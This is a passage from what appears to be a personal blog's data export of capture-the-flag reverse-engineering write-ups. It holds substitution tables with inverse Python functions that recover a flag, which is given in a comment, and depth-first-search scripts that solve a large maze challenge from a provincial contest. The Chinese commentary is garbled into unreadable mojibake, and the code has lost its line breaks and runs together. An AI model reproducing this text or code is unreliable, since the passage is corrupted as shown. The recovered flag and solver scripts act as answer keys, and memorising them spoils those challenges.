0xC0, 0xC7, 0xD1, 0x29, 0x98, 0xDD, 0xB6, 0x0E, 0x4D, 0xBF, 0x79, 0x0D, 0xDA, 0x7A, 0x17, 0x71, 0x43, 0x87, 0xFF, 0xDC, 0xC6, 0x12, 0xE9, 0x67, 0x2D, 0x70, 0x9F, 0x95, 0x30, 0x26, 0x24, 0x2B, 0xA8, 0xA2, 0xD8, 0x3B, 0x31, 0xA0, 0x3D, 0x4B, 0x90, 0x60, 0x34, 0x75, 0xE8, 0x5D, 0xF4, 0x85, 0xF3, 0xFE, 0x35, 0xCB, 0xB8, 0x02, 0x50, 0xB1, 0xF1, 0x1A, 0x1B, 0x21, 0xCD, 0xC4, 0x7E, 0xED, 0x07, 0xD9, 0xD6, 0x44, 0x15, 0x8E, 0x49, 0xB3, 0x97, 0xE6, 0x63, 0xB7, 0xEF, 0x3A, 0x8F, 0xF2, 0x53, 0x10, 0x77, 0x86, 0xF8, 0x8A, 0x28, 0x3F, 0xD4, 0x4C, 0xE5, 0x82, 0x83, 0xEC, 0x62, 0x89, 0xDF, 0xC3, 0x14, 0xCA, 0xA3, 0x5F, 0x64, 0x47, 0xFD, 0x00, 0x84, 0x66, 0xA7, 0x5A, 0x0C, 0x01, 0xD5, 0x5B, 0x0A, 0x4F, 0x27, 0x78, 0x0B, 0x2E, 0x48, 0x36, 0xFA, 0x08, 0x56, 0xE0, 0xA6, 0xC1, 0x5C, 0x8B, 0x41, 0x06, 0xBB, 0x52, 0x93, 0xAF, 0x2C, 0x5E, 0xF6, 0x61, 0xF0, 0xAB, 0x91, 0x45, 0x04, 0xBD, 0xCC, 0xE4, 0x65, 0x9D, 0x92, 0xCE, 0x40, 0xAE, 0x76, 0x9B, 0x9C, 0xAA, 0x54, 0xD0, 0x1C, 0x81, 0x4E, 0x57, 0x55, 0x23, 0x6E, 0x1E, 0x99, 0xDB, 0xFB, 0xA4, 0x22, 0x19, 0x58, 0x11, 0x8D, 0x94, 0xD3, 0xE2, 0x8C, 0xF5, 0x42, 0x46, 0xBC, 0x33, 0xE1]byb80 = [0x38, 0xD9, 0xDA, 0xE6, 0xB5, 0xF1, 0x0B, 0x93, 0x0C, 0x58, 0x0D, 0xAE, 0x0A, 0x85, 0x2A, 0x50, 0xC2, 0xBF, 0xD4, 0x28, 0x52, 0xC4, 0x4F, 0xE1, 0x44, 0xE0, 0xA2, 0x70, 0x36, 0x65, 0x4B, 0x41, 0x9D, 0x5F, 0x05, 0x7C, 0xF7, 0xD7, 0x99, 0x8B, 0xCC, 0xCE, 0x16, 0xBE, 0xB6, 0xC5, 0x8F, 0x79, 0xC7, 0x20, 0x7E, 0xF4, 0xF3, 0x2E, 0x4A, 0x89, 0xD6, 0x0F, 0x6E, 0xB0, 0x61, 0xB1, 0x6D, 0x19, 0x73, 0x03, 0x74, 0xA1, 0x40, 0xEC, 0xC0, 0x57, 0x94, 0x7A, 0x66, 0xD5, 0xEA, 0x17, 0x6A, 0x84, 0x37, 0xED, 0xF6, 0x13, 0x31, 0x5B, 0x82, 0x1E, 0xFC, 0x92, 0xE2, 0x42, 0x86, 0xBA, 0xE3, 0x91, 0x7F, 0x67, 0x5C, 0x98, 0x15, 0x22, 0x8D, 0x80, 0x04, 0xE4, 0x25, 0x09, 0xA0, 0xAD, 0x63, 0xE5, 0xB4, 0x9A, 0x3C, 0xA3, 0x3A, 0x69, 0xF8, 0xCD, 0xBC, 0x88, 0x55, 0xB2, 0xBD, 0x6B, 0x77, 0x71, 0xB3, 0xD3, 0x90, 0x75, 0x06, 0x49, 0xC3, 0x32, 0x4D, 0x1D, 0xA8, 0xAA, 0xFB, 0x7B, 0x7D, 0x2B, 0xA6, 0x34, 0x72, 0x47, 0xF0, 0x2F, 0x9C, 0x08, 0x00, 0x14, 0x8C, 0x26, 0x5E, 0x87, 0xD1, 0xCF, 0xC9, 0x18, 0x51, 0x23, 0xCB, 0xF5, 0x1C, 0x9F, 0x97, 0xF9, 0xBB, 0xA7, 0x39, 0x45, 0x02, 0xFD, 0x46, 0x8A, 0x54, 0xA4, 0x8E, 0x9E, 0x68, 0x96, 0x0E, 0x78, 0xB8, 0x3D, 0x11, 0x64, 0xAF, 0x10, 0xDE, 0x6C, 0x60, 0x5A, 0x76, 0x1A, 0xE9, 0xC1, 0x3E, 0xCA, 0x9B, 0x27, 0x30, 0xEF, 0xFF, 0x07, 0xD2, 0xB9, 0x2D, 0xD0, 0xEE, 0x83, 0xAB, 0xF2, 0x4C, 0xA5, 0x21, 0x62, 0x81, 0x33, 0x1B, 0xD8, 0x6F, 0xAC, 0x3B, 0x5D, 0xE8, 0xFA, 0x3F, 0xDB, 0x95, 0xE7, 0x59, 0x12, 0x48, 0x35, 0xC6, 0x2C, 0x4E, 0x01, 0xDD, 0x43, 0x29, 0xDC, 0x24, 0x1F, 0xB7, 0xA9, 0xEB, 0xC8, 0xFE, 0x56, 0xDF, 0x53]byd80 = [0xB0, 0x28, 0x0B, 0x89, 0x4B, 0xA4, 0xBE, 0x1A, 0x8F, 0x6C, 0xCF, 0xB2, 0xB5, 0xFE, 0xFB, 0x59, 0x2D, 0x29, 0x39, 0x62, 0x97, 0xAA, 0xD7, 0x7D, 0x94, 0x2C, 0xFC, 0x5D, 0xB4, 0x7C, 0x8A, 0x82, 0xD3, 0xA7, 0xBA, 0xDF, 0x21, 0xE6, 0xA2, 0xD0, 0xE8, 0xF0, 0x67, 0x3A, 0xB9, 0x98, 0xF9, 0xAE, 0xD1, 0x56, 0xD8, 0xCA, 0x10, 0xEA, 0x92, 0xA8, 0x75, 0x7E, 0x65, 0xA9, 0xAF, 0x51, 0xC9, 0x8E, 0xD4, 0x77, 0xE4, 0x49, 0x06, 0x61, 0x9E, 0x24, 0xD9, 0x9B, 0x11, 0x05, 0x1D, 0x96, 0x9A, 0xB1, 0xE0, 0x83, 0xE1, 0x1C, 0xCD, 0xF3, 0x38, 0xB3, 0x57, 0x50, 0xF4, 0xAC, 0xEB, 0x14, 0xA5, 0x46, 0xF6, 0x93, 0xAD, 0x7B, 0x30, 0xEF, 0x79, 0x17, 0x47, 0xDA, 0xC0, 0xDD, 0xDE, 0xDC, 0x5A, 0x76, 0x3B, 0x31, 0x0D, 0x0E, 0x86, 0xF1, 0x71, 0xFA, 0x0C, 0x00, 0xA3, 0xBF, 0x64, 0x37, 0x22, 0xD2, 0x69, 0x5C, 0xC6, 0x16, 0x9F, 0x5E, 0x7A, 0x1E, 0x27, 0x60, 0x6E, 0xF8, 0x8C, 0xEE, 0xC2, 0x74, 0x81, 0x8B, 0x33, 0x03, 0xBD, 0x2A, 0x0A, 0x68, 0x6B, 0x3F, 0x4C, 0xC3, 0x15, 0x04, 0x3D, 0x63, 0xF5, 0xAB, 0xCC, 0x3C, 0x53, 0x20, 0x66, 0xC4, 0xC1, 0x23, 0xE7, 0x25, 0x55, 0xC7, 0xED, 0xB7, 0xBC, 0xCB, 0x8D, 0x09, 0xCE, 0x52, 0xBB, 0xE2, 0xC5, 0xB6, 0x26, 0x12, 0x2F, 0x99, 0x58, 0x40, 0x6D, 0xA1, 0x3E, 0x48, 0x85, 0xA6, 0xF2, 0x0F, 0x43, 0x78, 0xB8, 0x01, 0xE5, 0xD5, 0x6F, 0x4E, 0xF7, 0x13, 0x42, 0xEC, 0x45, 0x2B, 0x4F, 0x36, 0xDB, 0x9C, 0xE3, 0x44, 0x34, 0x84, 0x73, 0x2E, 0x7F, 0xFD, 0x91, 0x41, 0xD6, 0x95, 0x18, 0xFF, 0x70, 0xC8, 0x02, 0x5F, 0x08, 0x1B, 0x6A, 0x5B, 0x19, 0xA0, 0x4D, 0x35, 0x54, 0xE9, 0x32, 0x88, 0x72, 0x07, 0x87, 0x90, 0x4A, 0x80, 0x1F, 0x9D]by1180 = [0xE8, 0x22, 0x64, 0x9F, 0xC5, 0xD5, 0x25, 0xC9, 0x5D, 0xDF, 0xA1, 0x74, 0xCB, 0x57, 0xF7, 0xF0, 0xBD, 0x56, 0xFF, 0x33, 0x79, 0xFE, 0x87, 0xB6, 0xB1, 0x54, 0x10, 0x95, 0x8A, 0xEC, 0x7B, 0x48, 0x84, 0x3D, 0x30, 0xEF, 0x86, 0xFA, 0x97, 0x1C, 0xDC, 0xA9, 0x5A, 0xF3, 0x67, 0x18, 0x83, 0x72, 0x06, 0xB9, 0xF5, 0x05, 0x68, 0x59, 0xF2, 0xE4, 0x88, 0x5E, 0x14, 0x17, 0x11, 0x9C, 0xAB, 0xDE, 0xEB, 0x7D, 0x62, 0x9B, 0xD6, 0xF4, 0x01, 0x29, 0xBC, 0xC0, 0x69, 0xA2, 0x2B, 0x0D, 0x1D, 0x98, 0x6A, 0xBE, 0x65, 0x09, 0xF8, 0x96, 0xB4, 0x6E, 0x63, 0xE3, 0x34, 0x2D, 0xCE, 0x0A, 0xCD, 0xAA, 0x21, 0xCC, 0xE7, 0xA5, 0xDB, 0xD8, 0x03, 0xDD, 0xB2, 0x1F, 0x9D, 0x9E, 0x0E, 0x8F, 0x8B, 0xCA, 0x92, 0x0B, 0xA7, 0x5B, 0xD2, 0xCF, 0x47, 0x07, 0x04, 0xAE, 0x3B, 0xA8, 0x7C, 0x73, 0xF9, 0x35, 0xEE, 0x7A, 0xB0, 0xBA, 0x85, 0x46, 0x3E, 0x81, 0xC7, 0x40, 0x37, 0x15, 0x3A, 0x19, 0xE0, 0x1E, 0x28, 0x4A, 0x4F, 0x8C, 0xD4, 0x51, 0x2E, 0x94, 0x89, 0x2A, 0x0F, 0x7E, 0xE1, 0xC8, 0x5F, 0x4E, 0x6D, 0xF6, 0x49, 0xB8, 0x55, 0x60, 0x82, 0x20, 0x36, 0xC1, 0x0C, 0x1B, 0xC4, 0x00, 0xE5, 0xA3, 0x2C, 0xE9, 0xC2, 0xF1, 0x23, 0x3F, 0xC3, 0xB5, 0x8D, 0xD7, 0x42, 0xFC, 0x50, 0x13, 0xBB, 0x61, 0x9A, 0x44, 0xE6, 0x91, 0x2F, 0x70, 0xC6, 0x6F, 0xD1, 0x27, 0x43, 0x08, 0xDA, 0xFD, 0x52, 0x71, 0x77, 0xED, 0xE2, 0xAD, 0x16, 0x8E, 0x12, 0x4C, 0x31, 0x3C, 0x39, 0x78, 0x90, 0xBF, 0x1A, 0x76, 0x75, 0x41, 0x99, 0xD0, 0x80, 0xB7, 0x66, 0x24, 0xD3, 0x7F, 0x4B, 0x45, 0x5C, 0x53, 0x4D, 0x26, 0x32, 0xA0, 0xFB, 0xB3, 0x38, 0x6B, 0xAF, 0xA6, 0xD9, 0x02, 0xA4, 0xEA, 0x6C, 0xAC, 0x58, 0x93]by1380 = [0x91, 0x67, 0x1A, 0xBE, 0xAB, 0xC2, 0x85, 0xD5, 0xDA, 0xCC, 0xF7, 0x5B, 0x54, 0x61, 0x05, 0xDF, 0x02, 0x70, 0x65, 0x69, 0x9A, 0x7A, 0x09, 0x92, 0x5D, 0x2A, 0xA7, 0x37, 0xFF, 0x19, 0xE6, 0x99, 0xF3, 0x1E, 0xBD, 0x82, 0x48, 0x3C, 0xE8, 0xC8, 0x66, 0x17, 0xB7, 0xA9, 0xC5, 0x4E, 0x33, 0x84, 0x45, 0xD3, 0x8B, 0x49, 0x50, 0x43, 0x8F, 0xCD, 0x73, 0x29, 0x04, 0xDC, 0x01, 0x0C, 0xDD, 0x2E, 0xFB, 0x6E, 0x0F, 0x24, 0x57, 0xE9, 0xC9, 0x7D, 0xB3, 0x40, 0x4B, 0x56, 0x6C, 0x68, 0xE2, 0x22, 0xF6, 0x80, 0xAA, 0x95, 0xD4, 0x97, 0x94, 0x21, 0x53, 0xD1, 0xE3, 0x59, 0xD2, 0xED, 0x41, 0x4D, 0x74, 0xA3, 0xA0, 0x32, 0x0D, 0xFC, 0x46, 0x34, 0xFA, 0xB1, 0x5E, 0xC6, 0x71, 0xC0, 0xE0, 0x3F, 0x13, 0x12, 0xD7, 0xEE, 0xF8, 0x26, 0xE1, 0x25, 0x88, 0x77, 0xB0, 0x8D, 0x6A, 0xEA, 0x0E, 0xD6, 0x3E, 0x03, 0x64, 0xBF, 0x8C, 0x96, 0xD9, 0xA4, 0x42, 0xAD, 0xFD, 0x16, 0x5A, 0xE4, 0x06, 0x9D, 0x07, 0x87, 0x5F, 0xAF, 0xDB, 0xC1, 0x93, 0x1C, 0xF1, 0xDE, 0xA6, 0x3A, 0xF4, 0x2C, 0x1B, 0x39, 0xE7, 0x4A, 0xC7, 0x35, 0xFE, 0x0A, 0x62, 0xF0, 0xCA, 0xEC, 0x27, 0x52, 0x23, 0x7F, 0xA5, 0x79, 0x7C, 0x75, 0x86, 0xEB, 0x60, 0xA8, 0xF5, 0x1F, 0x20, 0xC3, 0x63, 0x5C, 0x72, 0x18, 0xE5, 0x51, 0xAC, 0xB9, 0x90, 0x9F, 0x4C, 0xB2, 0xCB, 0x00, 0x6F, 0x28, 0xA1, 0xB6, 0x9B, 0xD0, 0x7B, 0x36, 0x4F, 0x9C, 0xCF, 0x98, 0x8A, 0x0B, 0x78, 0xB4, 0x7E, 0x2B, 0xEF, 0x58, 0xB5, 0xBA, 0x55, 0xB8, 0x10, 0x2F, 0x44, 0xAE, 0x89, 0x08, 0xC4, 0x3B, 0x9E, 0xF9, 0x6D, 0xF2, 0x15, 0x1D, 0x30, 0x47, 0x8E, 0x31, 0x2D, 0xD8, 0x6B, 0x3D, 0x11, 0x14, 0xA2, 0x83, 0xCE, 0xBB, 0x81, 0xBC, 0x76, 0x38]by1780 = [0x38, 0x5A, 0xC7, 0x98, 0x15, 0x6A, 0xC9, 0x28, 0x33, 0xEA, 0xF4, 0xD9, 0xDB, 0x77, 0xB8, 0x49, 0x1B, 0x79, 0xF5, 0xFD, 0x3E, 0xA2, 0xDE, 0x17, 0xC4, 0x5E, 0xE5, 0x11, 0xB6, 0x1D, 0x86, 0xF9, 0x90, 0x78, 0x8A, 0x14, 0x12, 0xB1, 0xC2, 0x21, 0xF1, 0x02, 0x58, 0xA1, 0x23, 0x0C, 0xAD, 0xA5, 0x50, 0x48, 0x1E, 0x6D, 0xF8, 0x96, 0x9D, 0x19, 0x00, 0xBD, 0x26, 0xCE, 0xA7, 0x24, 0x2E, 0x39, 0x7B, 0xFA, 0x5F, 0xCC, 0x1A, 0x0B, 0x40, 0x0F, 0x4B, 0x82, 0xE2, 0x97, 0x10, 0x2A, 0xFC, 0x3B, 0xB2, 0x66, 0x27, 0x54, 0x07, 0xE3, 0x08, 0xA3, 0xA6, 0xED, 0x62, 0x13, 0x9C, 0x20, 0x01, 0x92, 0xE8, 0xAE, 0xBE, 0xE1, 0x0A, 0x41, 0x94, 0x80, 0xA9, 0x2F, 0x29, 0x70, 0x35, 0x16, 0xF7, 0x6B, 0xFE, 0x9E, 0x0D, 0xD3, 0x7F, 0x1F, 0xA0, 0x32, 0xD2, 0x52, 0x05, 0x76, 0x89, 0x9B, 0x7A, 0x8F, 0x99, 0xEF, 0xCF, 0x51, 0x0E, 0xEC, 0x59, 0x5C, 0x37, 0xD5, 0x8E, 0x31, 0x34, 0x2D, 0x93, 0x25, 0x1C, 0xC8, 0x5B, 0x47, 0x9F, 0x03, 0x67, 0x7E, 0x42, 0x7D, 0x3A, 0xAA, 0x57, 0xDA, 0x9A, 0xAB, 0x74, 0x72, 0xE4, 0xB7, 0x5D, 0xCD, 0x87, 0x46, 0x2B, 0x43, 0xF3, 0xD0, 0x85, 0x55, 0xBB, 0xD4, 0xC6, 0x61, 0x56, 0x04, 0x65, 0x7C, 0x88, 0xC3, 0x73, 0xBC, 0xEB, 0xDD, 0x4D, 0xE0, 0xE6, 0xC0, 0x63, 0x8D, 0xF2, 0x81, 0xF6, 0xA8, 0x3D, 0x3F, 0xA4, 0xE9, 0x4A, 0xB5, 0xF0, 0xCA, 0x8B, 0x2C, 0xD7, 0xAC, 0xC5, 0xC1, 0xBF, 0x53, 0xD1, 0x6F, 0x06, 0xE7, 0xD6, 0x09, 0x95, 0x44, 0x71, 0xB9, 0x83, 0x4C, 0x22, 0xAF, 0xB4, 0x75, 0x36, 0x30, 0xCB, 0xEE, 0x91, 0x45, 0x8C, 0x4E, 0x6E, 0x6C, 0x4F, 0x84, 0xBA, 0xFF, 0x64, 0xB3, 0x60, 0xFB, 0xB0, 0x18, 0xD8, 0xDF, 0x3C, 0x68, 0xDC, 0x69]by1d80 = [0xD1, 0x9C, 0x68, 0xC0, 0x13, 0xAC, 0x48, 0x32, 0xA3, 0xBA, 0x4C, 0xE7, 0x6D, 0xC8, 0x1C, 0xAB, 0xE2, 0x7A, 0x42, 0xE1, 0x7B, 0x16, 0x67, 0x03, 0xAE, 0x7E, 0xAA, 0x38, 0x22, 0x02, 0x39, 0x51, 0xC7, 0x79, 0xD7, 0xCB, 0xEF, 0x62, 0x98, 0xDC, 0x53, 0x72, 0x89, 0xA5, 0x4B, 0xC6, 0x86, 0xF6, 0xFC, 0x77, 0x5A, 0xF5, 0x2E, 0x3D, 0xB2, 0xFE, 0x59, 0x27, 0x80, 0x63, 0xDD, 0x1A, 0x12, 0x5E, 0xED, 0xB0, 0xBC, 0xC4, 0x5F, 0x11, 0xC9, 0x09, 0xC5, 0x75, 0x96, 0x0A, 0x2F, 0x00, 0x17, 0x81, 0x14, 0x47, 0xBB, 0x9D, 0x8E, 0x3C, 0xD6, 0xA1, 0xE0, 0xA2, 0x26, 0x5D, 0x08, 0x6E, 0x4E, 0xF1, 0xCF, 0x73, 0x8A, 0x90, 0x0B, 0xB3, 0x3E, 0xB6, 0x1F, 0xC3, 0xB7, 0xDA, 0x8D, 0x05, 0xEE, 0x18, 0x93, 0x3A, 0x6A, 0x8C, 0x43, 0x8F, 0xEB, 0xE9, 0x5B, 0x29, 0x37, 0x1E, 0x46, 0x33, 0x31, 0xFB, 0x35, 0x34, 0x61, 0x04, 0x0E, 0x2B, 0x74, 0xF9, 0x8B, 0x2C, 0x20, 0x0C, 0x7C, 0x28, 0x5C, 0xCA, 0xE6, 0x6B, 0xD8, 0x30, 0xE4, 0x21, 0x44, 0x70, 0x06, 0xA6, 0x60, 0x41, 0x84, 0x10, 0x95, 0x4F, 0x64, 0x83, 0xD2, 0x9A, 0xBE, 0xAF, 0x9F, 0x07, 0xC1, 0xB8, 0x3B, 0x65, 0xCC, 0x57, 0xB5, 0xD9, 0x92, 0xDE, 0x0D, 0xE3, 0xF3, 0xA4, 0xBD, 0x6F, 0xD3, 0x25, 0x88, 0x71, 0xFF, 0xA9, 0x36, 0xB1, 0x78, 0x24, 0x69, 0xAD, 0x19, 0xBF, 0xFD, 0xCD, 0x4A, 0xEA, 0x87, 0x91, 0xA8, 0x66, 0x82, 0x50, 0x0F, 0x99, 0x45, 0xF2, 0xD5, 0x9B, 0x94, 0x7D, 0xCE, 0xDB, 0xB9, 0x52, 0xE5, 0xF4, 0x01, 0x7F, 0xD4, 0x15, 0x2D, 0x3F, 0x1D, 0xA7, 0xC2, 0xFA, 0x40, 0xE8, 0xA0, 0x55, 0x6C, 0xF7, 0x1B, 0x58, 0x85, 0x56, 0x9E, 0xEC, 0x97, 0x23, 0xF0, 0x4D, 0xD0, 0xF8, 0x2A, 0x49, 0xB4, 0x76, 0x54, 0xDF]def fun2(): for i in range(1,len(flag)-1): for j in range(len(by280)): if flag[i] == by280[j]: flag[i] = j breakdef fun3(): for i in range(1,len(flag)-1): for j in range(len(by380)): if flag[i] == by380[j]: flag[i] = j breakdef fun5(): for i in range(1,len(flag)-1): for j in range(len(by580)): if flag[i] == by580[j]: flag[i] = j breakdef fun7(): for i in range(1,len(flag)-1): for j in range(len(by780)): if flag[i] == by780[j]: flag[i] = j breakdef funb(): for i in range(1,len(flag)-1): for j in range(len(byb80)): if flag[i] == byb80[j]: flag[i] = j breakdef fund(): for i in range(1,len(flag)-1): for j in range(len(byd80)): if flag[i] == byd80[j]: flag[i] = j break def fun11(): for i in range(1,len(flag)-1): for j in range(len(by1180)): if flag[i] == by1180[j]: flag[i] = j break def fun13(): for i in range(1,len(flag)-1): for j in range(len(by1380)): if flag[i] == by1380[j]: flag[i] = j break def fun17(): for i in range(1,len(flag)-1): for j in range(len(by1780)): if flag[i] == by1780[j]: flag[i] = j breakdef fun1d(): for i in range(1,len(flag)-1): for j in range(len(by1d80)): if flag[i] == by1d80[j]: flag[i] = j breakfun1d()fun17()fun13()fun11()fund()funb()fun7()fun5()fun3()fun2()print(bytearray(flag))index = [&#x27;2&#x27;, &#x27;3&#x27;, &#x27;5&#x27;, &#x27;7&#x27;, &#x27;b&#x27;, &#x27;d&#x27;, &#x27;11&#x27;, &#x27;13&#x27;, &#x27;17&#x27;, &#x27;1d&#x27;]# #y0u_4r3_7h3_m4573r_0f_r3v3r51n6_! &#x3D;&#x3D;ç„¶åè¿™é‡Œæ³¨æ„çš„æ˜¯flag[i] &#x3D; jåä¸€å®šè¦åŠ breakï¼Œä¸ç„¶ä¼šæ— ï¼Œç„¶åç¬¬äºŒæ®µæ•°æ®æœ‰å¤šè§£ï¼Œåœ¨ç§»ä½æ“ä½œå¤„åŠ &amp;0xfffffff,æ¯”å¦‚((a1[12] &lt;&lt; 6)&amp;0xffffffff)ï¼Œè¿™æ ·æ‰ç®—å’Œcä»£ç æˆåŠŸè½¬æ¢&#x3D;&#x3D;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"å®‰å¾½çœèµ›","slug":"å®‰å¾½çœèµ›","date":"2022-11-21T06:13:57.000Z","updated":"2022-11-29T08:53:10.582Z","comments":true,"path":"2022/11/21/å®‰å¾½çœèµ›/","link":"","permalink":"https://pa1r0t.github.io/2022/11/21/%E5%AE%89%E5%BE%BD%E7%9C%81%E8%B5%9B/","excerpt":"å®‰å¾½çœèµ›åªæœ‰ä¸€ä¸ªå°æ—¶ï¼Œæˆ‘åäº†ï¼Œè„šæœ¬éƒ½æ¥ä¸åŠå†™ã€‚ã€‚ã€‚ã€‚èµ›åæ‰æŠŠflagæå‡ºæ¥","text":"å®‰å¾½çœèµ›åªæœ‰ä¸€ä¸ªå°æ—¶ï¼Œæˆ‘åäº†ï¼Œè„šæœ¬éƒ½æ¥ä¸åŠå†™ã€‚ã€‚ã€‚ã€‚èµ›åæ‰æŠŠflagæå‡ºæ¥ å‘ƒï¼Œ æˆ‘å…¶å®ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§è¿™ä¹ˆåºå¤§çš„è¿·å®«ï¼Œä¸€å…±4384ä¸ªæ ¼~~ è¿™é‡Œçœ‹è§ä¸€è¡Œ66 ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œè¿™é‡Œä¸åšè¿‡å¤šä»‹ç» &#x2F;æˆ‘åŸå…ˆçš„è„šæœ¬çš„æ€è·¯æ˜¯èµ°åˆ°é”™çš„åœ°æ–¹å†è¿”å›ï¼Œå¯¼è‡´æ•ˆç‡å¤ªä½ï¼Œè·‘äº†å¥½ä¹…éƒ½æ²¡è·‘å‡ºæ¥&#x2F; èµ›åæˆ‘è¿˜æœªæƒ³å¥½è¯¥æ€ä¹ˆä¼˜åŒ–æˆ‘çš„æ·±æœç®—æ³•ï¼Œæ‰€ä»¥å°±è¿›è¡Œäº†ä¸€æ³¢æ‰‹å·¥ç”»å›¾ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ å›¾ä¸€ï¼š å›¾äºŒï¼š å›¾ä¸‰ï¼š emmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm ç„¶åå°±æ ¹æ®è¿™ä¸ªè·¯çº¿ï¼Œæ‰‹å†™è·¯çº¿å­—ç¬¦ä¸² ä»¥ä¸Šæ˜¯æˆ‘å†™çš„ï¼Œæœ¬åŠæ³•ï¼Œå¤ªèœäº†ï¼Œåªèƒ½è¿™ä¹ˆæäº† ##ä¸‹é¢è´´ä¸ŠEDIå›¢é˜Ÿçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041map = []data =[map[i*66:i*66+66] for i in range(66)]print(data)usedmap = [[0 for i in range(len(data))] for i in range(len(data)) ]flag=&quot;&quot;def DFS(x,y): global flag if x == 64 and y == 65: print(flag) if data[x+1][y] == 0 and usedmap [x+1][y] == 0: usedmap [x][y] = 1 flag += &#x27;s&#x27; DFS(x+1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x-1][y] == 0 and usedmap [x-1][y] == 0: usedmap [x][y] = 1 flag += &#x27;w&#x27; DFS(x-1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y+1] == 0 and usedmap [x][y+1] == 0: usedmap [x][y] = 1 flag += &#x27;d&#x27; DFS(x,y+1) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y-1] == 0 and usedmap [x][y-1] == 0: usedmap [x][y] = 1 flag += &#x27;a&#x27; DFS(x,y-1) flag = flag[:-1] usedmap [x][y] = 0y=0x=1try: DFS(x,y)except: pass ä»–ä»¬çš„è„šæœ¬å…¶å®å°±æ˜¯åªèµ°å¯¹çš„ä½ç½®ï¼Œæˆ‘å®åœ¨æ²¡æƒ³åˆ°å±…ç„¶æ•ˆç‡ä¼šå¿«è¿™ä¹ˆå¤šï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ åæ¥æˆ‘å‚ç…§ä»–ä»¬çš„æ€è·¯ï¼Œé‡æ–°ä¼˜åŒ–äº†ä¸€ä¸‹æˆ‘çš„è„šæœ¬ï¼Œå¯ä»¥è¯´åœ¨ä»–ä»¬çš„åŸºç¡€ä¸Šåœ¨ä¸€æ¬¡ä¼˜åŒ–äº†ç¨‹åºçš„æ•ˆç‡ åªèƒ½è¯´ç®—æ³•å®åœ¨å¤ªé‡è¦äº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ æˆ‘çš„ä»£ç ï¼š1234567891011121314151617181920212223242526272829303132def dfs(v6, v7): global flag if len(flag) &gt; 364: # è¿™é‡Œé˜²æ­¢æ·±åº¦è¿‡æ·± return if v6 == 64 and v7 == 65: print(flag) tlag[66 * v6 + v7] = 1 # æ ‡è®°èµ°è¿‡äº† if map1[66 * v6 + v7 + 1] == 0 and tlag[66 * v6 + v7+1] == 0: # è¿™ä¸ªä½ç½®èƒ½ä¸èƒ½èµ°ï¼Œæœ‰æ²¡æœ‰èµ°è¿‡ flag += &#x27;d&#x27; dfs(v6, v7 + 1) flag = flag[:-1] if map1[66 * (v6+1) + v7] == 0 and tlag[66 * (v6+1) + v7] == 0: flag += &#x27;s&#x27; dfs(v6+1,v7) flag = flag[:-1] if map1[66 * (v6-1) + v7] == 0 and tlag[66 * (v6-1) + v7] == 0: flag += &#x27;w&#x27; dfs(v6-1, v7) flag = flag[:-1] if map1[66 * (v6) + v7 - 1] == 0 and tlag[66 * (v6) + v7-1] == 0: flag += &#x27;a&#x27; dfs(v6, v7 - 1) flag = flag[:-1] # è¿™é‡Œä¸ç”¨å°†æ ‡å¿—å»æ‰ï¼Œå› ä¸ºè¿™ä¸ªä½ç½®æ‰€æœ‰æ–¹å‘éƒ½èµ°è¿‡äº†éƒ½æ²¡åˆ°ç»ˆç‚¹ï¼Œé‚£ä¹ˆå…¶ä»–ä½ç½®åˆ°è¾¾è¯¥ä½ç½®ä¹Ÿæ— æ³•åˆ°è¾¾ç»ˆç‚¹ï¼Œæ‰€ä»¥æ‡‚å§ï¼Ÿif __name__ == &quot;__main__&quot;: map1 = [] tlag = [0]*len(map1) flag = &quot;&quot; try: dfs(1, 0) except: pass è‡³äºä»£ç çš„ç»†èŠ‚è¿™é‡Œç›´æ¥çœ‹æ³¨é‡Šå³å¯ï¼Œéƒ½å·²ç»å†™å¥½äº† æ€»ç»“è¿™é‡Œä¸ªäººçš„ç®—æ³•åŠŸåº•è¿˜æœ‰å¾…æå‡ï¼Œç®—æ³•è¿˜æ˜¯è¦å¤šç»ƒï¼Œä¸ç„¶æ˜æ˜ä¼šåšï¼Œä½†æ˜¯ç°åœºåšä¸å‡ºæ¥ï¼Œå¤ªéš¾å—äº†ï¼ï¼ï¼","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]}],"categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]}